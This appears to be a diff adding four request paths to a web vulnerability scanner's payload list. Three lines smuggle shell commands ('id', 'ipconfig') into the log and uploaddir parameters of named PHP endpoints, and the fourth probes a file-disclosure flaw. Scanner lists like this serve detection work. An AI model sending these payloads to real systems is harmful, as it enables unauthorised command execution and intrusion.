@@ -1,0 +1,4 @@
+/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20id
+/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20ipconfig
+/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27
+/css_parser.php?css=css_parser.php
